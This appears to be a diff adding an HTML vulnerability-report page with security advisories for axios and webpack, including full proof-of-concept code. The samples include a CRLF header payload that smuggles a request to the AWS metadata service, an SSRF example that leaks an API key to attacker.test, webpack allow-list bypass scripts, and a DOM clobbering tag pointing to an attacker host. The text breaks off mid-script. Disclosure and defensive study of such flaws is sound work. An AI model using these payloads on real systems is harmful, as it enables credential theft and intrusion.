+This vulnerability is unique because it requires **Zero Direct User Input**.
+If an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.
+
+Because Axios does not sanitise these merged header values for CRLF (`\r\n`) characters, the polluted property becomes a **Request Smuggling** payload.
+
+## Proof of Concept
+
+### 1. The Setup (Simulated Pollution)
+Imagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:
+```javascript
+Object.prototype[&#39;x-amz-target&#39;] = &#34;dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\nGET /ignore&#34;;
+```
+
+### 2. The Gadget Trigger (Safe Code)
+The application makes a completely safe, hardcoded request:
+```javascript
+// This looks safe to the developer
+await axios.get(&#39;https://analytics.internal/pings&#39;); 
+```
+
+### 3. The Execution
+Axios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.
+
+**Resulting HTTP traffic:**
+```http
+GET /pings HTTP/1.1
+Host: analytics.internal
+x-amz-target: dummy
+
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+GET /ignore HTTP/1.1
+...
+```
+
+### 4. The Impact (IMDSv2 Bypass)
+The &#34;Smuggled&#34; second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).
+The Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.
+
+## Impact Analysis
+-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).
+-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.
+-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.
+
+## Recommended Fix
+Validate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the underlying request function.
+
+**Patch Suggestion:**
+```javascript
+// In lib/adapters/http.js
+utils.forEach(requestHeaders, function setRequestHeader(val, key) {
+  if (/[\r\n]/.test(val)) {
+    throw new Error(&#39;Security: Header value contains invalid characters&#39;);
+  }
+  // ... proceed to set header
+});
+```
+
+## References
+-   **OWASP**: CRLF Injection (CWE-113)
+
+This report was generated as part of a security audit of the Axios library.
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-27152</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL. ### Summary
+
+A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463
+
+A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.
+
+### Details
+
+Consider the following code snippet:
+
+```js
+import axios from &#34;axios&#34;;
+
+const internalAPIClient = axios.create({
+  baseURL: &#34;http://example.test/api/v1/users/&#34;,
+  headers: {
+    &#34;X-API-KEY&#34;: &#34;1234567890&#34;,
+  },
+});
+
+// const userId = &#34;123&#34;;
+const userId = &#34;http://attacker.test/&#34;;
+
+await internalAPIClient.get(userId); // SSRF
+```
+
+In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.
+
+It is recommended that:
+
+-	When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.
+-	Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.
+
+### PoC
+
+Follow the steps below to reproduce the issue:
+
+1.	Set up two simple HTTP servers:
+
+```
+mkdir /tmp/server1 /tmp/server2
+echo &#34;this is server1&#34; &gt; /tmp/server1/index.html 
+echo &#34;this is server2&#34; &gt; /tmp/server2/index.html
+python -m http.server -d /tmp/server1 10001 &amp;
+python -m http.server -d /tmp/server2 10002 &amp;
+```
+
+
+2.	Create a script (e.g., main.js):
+
+```js
+import axios from &#34;axios&#34;;
+const client = axios.create({ baseURL: &#34;http://localhost:10001/&#34; });
+const response = await client.get(&#34;http://localhost:10002/&#34;);
+console.log(response.data);
+```
+
+3.	Run the script:
+
+```
+$ node main.js
+this is server2
+```
+
+Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.
+
+### Impact
+
+-	Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.
+-	SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.
+-	Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2023-45857</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						Axios Cross-Site Request Forgery Vulnerability. An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-68157</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> webpack
+					</div>
+					<div class="vuln-description">
+						webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence. ### Summary
+When `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.
+
+### Details
+In the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.
+
+Practical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.
+
+**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.
+
+&lt;img width=&#34;1648&#34; height=&#34;461&#34; alt=&#34;image&#34; src=&#34;https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524&#34; /&gt;
+
+
+### PoC
+This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.
+
+#### 1) Setup
+```bash
+mkdir split-ssrf-poc &amp;&amp; cd split-ssrf-poc
+npm init -y
+npm i -D webpack webpack-cli
+```
+
+#### 2) Create server.js
+```js
+#!/usr/bin/env node
+&#34;use strict&#34;;
+
+const http = require(&#34;http&#34;);
+const url = require(&#34;url&#34;);
+
+const allowedPort = 9000;
+const internalPort = 9100;
+
+const internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;
+const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;
+const internalPayload =
+  `export const secret = ${JSON.stringify(secret)};\n` +
+  `export default &#34;ok&#34;;\n`;
+
+function start(port, handler) {
+  return new Promise(resolve =&gt; {
+    const s = http.createServer(handler);
+    s.listen(port, &#34;127.0.0.1&#34;, () =&gt; resolve(s));
+  });
+}
+
+(async () =&gt; {
+  // Internal-only service (SSRF target)
+  await start(internalPort, (req, res) =&gt; {
+    if (req.url === &#34;/secret.js&#34;) {
+      res.statusCode = 200;
+      res.setHeader(&#34;Content-Type&#34;, &#34;application/javascript; charset=utf-8&#34;);
+      res.end(internalPayload);
+      console.log(`[internal] 200 /secret.js served (secret=${secret})`);
+      return;
+    }
+    res.statusCode = 404;
+    res.end(&#34;not found&#34;);
+  });
+
+  // Allowed host (redirector)
+  await start(allowedPort, (req, res) =&gt; {
+    const parsed = url.parse(req.url, true);
+
+    if (parsed.pathname === &#34;/redirect.js&#34;) {
+      const to = parsed.query.to || internalUrlDefault;
+
+      // Safety guard: only allow redirecting to localhost internal service in this PoC
+      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {
+        res.statusCode = 400;
+        res.end(&#34;to must be internal-only in this PoC&#34;);
+        console.log(`[allowed] blocked redirect to: ${to}`);
+        return;
+      }
+
+      res.statusCode = 302;
+      res.setHeader(&#34;Location&#34;, to);
+      res.end(&#34;redirecting&#34;);
+      console.log(`[allowed] 302 /redirect.js -&gt; ${to}`);
+      return;
+    }
+
+    res.statusCode = 404;
+    res.end(&#34;not found&#34;);
+  });
+
+  console.log(`\nServer running:`);
+  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);
+  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);
+})();
+```
+
+#### 3) Create attacker.js
+```js
+#!/usr/bin/env node
+&#34;use strict&#34;;
+
+const path = require(&#34;path&#34;);
+const os = require(&#34;os&#34;);
+const fs = require(&#34;fs/promises&#34;);
+const webpack = require(&#34;webpack&#34;);
+const webpackPkg = require(&#34;webpack/package.json&#34;);
+
+const allowedPort = 9000;
+const internalPort = 9100;
+
+const allowedBase = `http://127.0.0.1:${allowedPort}/`;
+const internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;
+const entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;
+
+async function walk(dir) {
+  const out = [];
+  const items = await fs.readdir(dir, { withFileTypes: true });
+  for (const it of items) {
+    const p = path.join(dir, it.name);
+    if (it.isDirectory()) out.push(...await walk(p));
+    else if (it.isFile()) out.push(p);
+  }
+  return out;
+}
+
+async function fileContains(f, needle) {
+  try {
+    const buf = await fs.readFile(f);
+    return buf.toString(&#34;utf8&#34;).includes(needle) || buf.toString(&#34;latin1&#34;).includes(needle);
+  } catch {
+    return false;
+  }
+}
+
+async function findInFiles(files, needle) {
+  const hits = [];
+  for (const f of files) if (await fileContains(f, needle)) hits.push(f);
+  return hits;
+}
+
+const fmtBool = b =&gt; (b ? &#34;✅&#34; : &#34;❌&#34;);
+
+(async () =&gt; {
+  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), &#34;webpack-attacker-&#34;));
+  const srcDir = path.join(tmp, &#34;src&#34;);
+  const distDir = path.join(tmp, &#34;dist&#34;);
+  const cacheDir = path.join(tmp, &#34;.buildHttp-cache&#34;);
+  const lockfile = path.join(tmp, &#34;webpack.lock&#34;);
+  const bundlePath = path.join(distDir, &#34;bundle.js&#34;);
+
+  await fs.mkdir(srcDir, { recursive: true });
+  await fs.mkdir(distDir, { recursive: true });
+
+  await fs.writeFile(
+    path.join(srcDir, &#34;index.js&#34;),
+    `import { secret } from ${JSON.stringify(entryUrl)};
+console.log(&#34;LEAKED_SECRET:&#34;, secret);
+export default secret;
+`
+  );
+
+  const config = {
+    context: tmp,
+    mode: &#34;development&#34;,
+    entry: &#34;./src/index.js&#34;,
+    output: { path: distDir, filename: &#34;bundle.js&#34; },
+    experiments: {
+      buildHttp: {
+        allowedUris: [allowedBase],
+        cacheLocation: cacheDir,
+        lockfileLocation: lockfile,
+        upgrade: true
+      }
+    }
+  };
+
+  const compiler = webpack(config);
+
+  compiler.run(async (err, stats) =&gt; {
+    try {
+      if (err) throw err;
+
+      const info = stats.toJson({ all: false, errors: true, warnings: true });
+      if (stats.hasErrors()) {
+        console.error(info.errors);
+        process.exitCode = 1;
+        return;
+      }
+
+      const bundle = await fs.readFile(bundlePath, &#34;utf8&#34;);
+      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);
+      const secret = m ? m[0] : null;
+
+      console.log(&#34;\n[ATTACKER RESULT]&#34;);
+      console.log(`- webpack version: ${webpackPkg.version}`);
+      console.log(`- node version: ${process.version}`);
+      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);
+      console.log(`- imported URL (allowed only): ${entryUrl}`);
+      console.log(`- temp dir: ${tmp}`);
+      console.log(`- lockfile: ${lockfile}`);
+      console.log(`- cacheDir: ${cacheDir}`);
+      console.log(`- bundle:   ${bundlePath}`);
+
+      if (!secret) {
+        console.log(&#34;\n[SECURITY SUMMARY]&#34;);
+        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);
+        return;
+      }
+
+      const lockHit = await fileContains(lockfile, secret);
+
+      let cacheFiles = [];
+      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }
+      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length &gt; 0 : false;
+
+      const allTmpFiles = await walk(tmp);
+      const allHits = await findInFiles(allTmpFiles, secret);
+
+      console.log(`\n- extracted secret marker from bundle: ${secret}`);
+
+      console.log(&#34;\n[SECURITY SUMMARY]&#34;);
+      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);
+      console.log(`- Internal target (SSRF-like): ${internalTarget}`);
+      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);
+      console.log(`- ACTUAL: internal content treated as module and bundled`);
+
+      console.log(&#34;\n[EVIDENCE CHECKLIST]&#34;);
+      console.log(`- bundle contains secret:   ${fmtBool(true)}`);
+      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);
+      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);
+
+      console.log(&#34;\n[PERSISTENCE CHECK] files containing secret&#34;);
+      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);
+      if (allHits.length &gt; 30) console.log(`- ... and ${allHits.length - 30} more`);
+    } catch (e) {
+      console.error(e);
+      process.exitCode = 1;
+    } finally {
+      compiler.close(() =&gt; {});
+    }
+  });
+})();
+```
+
+#### 4) Run
+Terminal A:
+```bash
+node server.js
+```
+
+Terminal B:
+```bash
+node attacker.js
+```
+
+#### 5) Expected
+
+Expected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).
+
+### Impact
+
+Vulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).
+
+Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:
+
+trigger network requests from the build machine to internal-only services (SSRF behavior),
+
+cause content from outside the allow-list to be bundled into build outputs,
+
+and cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-43788</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> webpack
+					</div>
+					<div class="vuln-description">
+						Webpack&#39;s AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS. ### Summary
+
+We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.
+
+We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.
+
+
+### Details
+
+#### Backgrounds
+
+DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:
+
+[1] https://scnps.co/papers/sp23_domclob.pdf
+[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/
+
+
+#### Gadgets found in Webpack
+
+We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:
+
+```
+/******/ 	/* webpack/runtime/publicPath */
+/******/ 	(() =&gt; {
+/******/ 		var scriptUrl;
+/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + &#34;&#34;;
+/******/ 		var document = __webpack_require__.g.document;
+/******/ 		if (!scriptUrl &amp;&amp; document) {
+/******/ 			if (document.currentScript)
+/******/ 				scriptUrl = document.currentScript.src;
+/******/ 			if (!scriptUrl) {
+/******/ 				var scripts = document.getElementsByTagName(&#34;script&#34;);
+/******/ 				if(scripts.length) {
+/******/ 					var i = scripts.length - 1;
+/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
+/******/ 				}
+/******/ 			}
+/******/ 		}
+/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
+/******/ 		// or pass an empty string (&#34;&#34;) and set the __webpack_public_path__ variable from your code to use your own logic.
+/******/ 		if (!scriptUrl) throw new Error(&#34;Automatic publicPath is not supported in this browser&#34;);
+/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, &#34;&#34;).replace(/\?.*$/, &#34;&#34;).replace(/\/[^\/]+$/, &#34;/&#34;);
+/******/ 		__webpack_require__.p = scriptUrl;
+/******/ 	})();
+```
+
+However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker&#39;s domain. This could lead to arbitrary script loading from the attacker&#39;s server, resulting in severe security risks.
+
+### PoC
+
+Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.
+
+Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:
+
+```
+// entry.js
+import(&#39;./import1.js&#39;)
+  .then(module =&gt; {
+    module.hello();
+  })
+  .catch(err =&gt; {
+    console.error(&#39;Failed to load module&#39;, err);
+  });
+```
+
+```
+// import1.js
+export function hello () {
+  console.log(&#39;Hello&#39;);
+}
+```
+
+The webpack.config.js is set up as follows:
+```
+const path = require(&#39;path&#39;);
+
+module.exports = {
+  entry: &#39;./entry.js&#39;, // Ensure the correct path to your entry file
+  output: {
+    filename: &#39;webpack-gadgets.bundle.js&#39;, // Output bundle file
+    path: path.resolve(__dirname, &#39;dist&#39;), // Output directory
+    publicPath: &#34;auto&#34;, // Or leave this field not set
+  },
+  target: &#39;web&#39;,
+  mode: &#39;development&#39;,
+};
+```
+
+When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker&#39;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website&#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.
+
+```
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Webpack Example&lt;/title&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
+  &lt;img name=&#34;currentScript&#34; src=&#34;https://attacker.controlled.server/&#34;&gt;&lt;/img&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
+&lt;/head&gt;
+&lt;script src=&#34;./dist/webpack-gadgets.bundle.js&#34;&gt;&lt;/script&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+
+### Impact
+
+This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.
+
+### Patch
+
+A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174
+
+```
+/******/ 	/* webpack/runtime/publicPath */
+/******/ 	(() =&gt; {
+/******/ 		var scriptUrl;
+/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + &#34;&#34;;
+/******/ 		var document = __webpack_require__.g.document;
+/******/ 		if (!scriptUrl &amp;&amp; document) {
+/******/ 			if (document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === &#39;SCRIPT&#39;) // Assume attacker cannot control script tag, otherwise it is XSS already :&gt;
+/******/ 				scriptUrl = document.currentScript.src;
+/******/ 			if (!scriptUrl) {
+/******/ 				var scripts = document.getElementsByTagName(&#34;script&#34;);
+/******/ 				if(scripts.length) {
+/******/ 					var i = scripts.length - 1;
+/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
+/******/ 				}
+/******/ 			}
+/******/ 		}
+/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
+/******/ 		// or pass an empty string (&#34;&#34;) and set the __webpack_public_path__ variable from your code to use your own logic.
+/******/ 		if (!scriptUrl) throw new Error(&#34;Automatic publicPath is not supported in this browser&#34;);
+/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, &#34;&#34;).replace(/\?.*$/, &#34;&#34;).replace(/\/[^\/]+$/, &#34;/&#34;);
+/******/ 		__webpack_require__.p = scriptUrl;
+/******/ 	})();
+```
+
+Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-68458</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> webpack
+					</div>
+					<div class="vuln-description">
+						webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior. ### Summary
+When `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) can be bypassed to fetch resources from **hosts outside `allowedUris`** by using crafted URLs that include **userinfo** (`username:password@host`). If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.
+
+Reproduced on:
+- webpack version: **5.104.0**
+- Node version: **v18.19.1**
+
+### Details
+**Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`.
+
+Example crafted URL:
+- `http://127.0.0.1:9000@127.0.0.1:9100/secret.js`
+
+If the allow-list is `[&#34;http://127.0.0.1:9000&#34;]`, then:
+- Raw string check:  
+  `crafted.startsWith(&#34;http://127.0.0.1:9000&#34;)` → **true**
+- URL parsing (WHAT `new URL()` will contact):  
+  `origin` → `http://127.0.0.1:9100` (host/port after `@`)
+
+As a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`.
+
+**Evidence from reproduction:**
+- Server logs showed the internal-only endpoint being fetched:
+  - `[internal] 200 /secret.js served (...)` (observed multiple times)
+- Attacker-side build output showed:
+  - the internal secret marker was present in the **bundle**
+  - the internal secret marker was present in the **buildHttp cache**
+
+&lt;img width=&#34;1651&#34; height=&#34;381&#34; alt=&#34;image-2&#34; src=&#34;https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492&#34; /&gt;
+
+### PoC
+This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.
+
+#### 1) Setup
+```bash
+mkdir split-userinfo-poc &amp;&amp; cd split-userinfo-poc
+npm init -y
+npm i -D webpack webpack-cli
+```
+
+#### 2) Create server.js
+```js
+#!/usr/bin/env node
+&#34;use strict&#34;;
+
+const http = require(&#34;http&#34;);
+
+const ALLOWED_PORT = 9000;   // allowlisted-looking host
+const INTERNAL_PORT = 9100;  // actual target if bypass succeeds
+
+const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;
+const internalPayload =
+  `// internal-only\n` +
+  `export const secret = ${JSON.stringify(secret)};\n` +
+  `export default &#34;ok&#34;;\n`;
+
+function listen(port, handler) {
+  return new Promise(resolve =&gt; {
+    const s = http.createServer(handler);
+    s.listen(port, &#34;127.0.0.1&#34;, () =&gt; resolve(s));
+  });
+}
+
+(async () =&gt; {
+  // &#34;Allowed&#34; host (should NOT be contacted if bypass works as intended)
+  await listen(ALLOWED_PORT, (req, res) =&gt; {
+    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);
+    res.statusCode = 200;
+    res.setHeader(&#34;Content-Type&#34;, &#34;application/javascript; charset=utf-8&#34;);
+    res.end(`export default &#34;ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY&#34;;\n`);
+  });
+
+  // Internal-only service (SSRF-like target)
+  await listen(INTERNAL_PORT, (req, res) =&gt; {
+    if (req.url === &#34;/secret.js&#34;) {
+      console.log(`[internal] 200 /secret.js served (secret=${secret})`);
+      res.statusCode = 200;
+      res.setHeader(&#34;Content-Type&#34;, &#34;application/javascript; charset=utf-8&#34;);
+      res.end(internalPayload);
+      return;
+    }
+    console.log(`[internal] 404 ${req.method} ${req.url}`);
+    res.statusCode = 404;
+    res.end(&#34;not found&#34;);
+  });
+
+  console.log(&#34;\nServers up:&#34;);
+  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);
+  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);
+})();
+```
+
+#### 2) Create server.js
+```js
+#!/usr/bin/env node
+&#34;use strict&#34;;
+
+const path = require(&#34;path&#34;);
+const os = require(&#34;os&#34;);
+const fs = require(&#34;fs/promises&#34;);
+const webpack = require(&#34;webpack&#34;);
+
+function fmtBool(b) { return b ? &#34;✅&#34; : &#34;❌&#34;; }
+
+async function walk(dir) {
+  const out = [];
+  let items;
+  try { items = await fs.readdir(dir, { withFileTypes: true }); }
+  catch { return out; }
+  for (const it of items) {
+    const p = path.join(dir, it.name);
+    if (it.isDirectory()) out.push(...await walk(p));
+    else if (it.isFile()) out.push(p);
+  }
+  return out;
+}
+
+async function fileContains(f, needle) {
+  try {
+    const buf = await fs.readFile(f);
+    const s1 = buf.toString(&#34;utf8&#34;);
+    if (s1.includes(needle)) return true;
+    const s2 = buf.toString(&#34;latin1&#34;);
+    return s2.includes(needle);
+  } catch {
+    return false;
+  }
+}
+
+(async () =&gt; {
+  const webpackVersion = require(&#34;webpack/package.json&#34;).version;
+
+  const ALLOWED_PORT = 9000;
+  const INTERNAL_PORT = 9100;
+
+  // NOTE: allowlist is intentionally specified without a trailing slash
+  // to demonstrate the risk of raw string prefix checks.
+  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;
+
+  // Crafted URL using userinfo so that:
+  // - The string begins with allowedUri
+  // - The actual authority (host:port) after &#39;@&#39; is INTERNAL_PORT
+  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;
+  const parsed = new URL(crafted);
+
+  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), &#34;webpack-httpuri-userinfo-poc-&#34;));
+  const srcDir = path.join(tmp, &#34;src&#34;);
+  const distDir = path.join(tmp, &#34;dist&#34;);
+  const cacheDir = path.join(tmp, &#34;.buildHttp-cache&#34;);
+  const lockfile = path.join(tmp, &#34;webpack.lock&#34;);
+  const bundlePath = path.join(distDir, &#34;bundle.js&#34;);
+
+  await fs.mkdir(srcDir, { recursive: true });
+  await fs.mkdir(distDir, { recursive: true });
+
+  await fs.writeFile(
+    path.join(srcDir, &#34;index.js&#34;),
+    `import { secret } from ${JSON.stringify(crafted)};
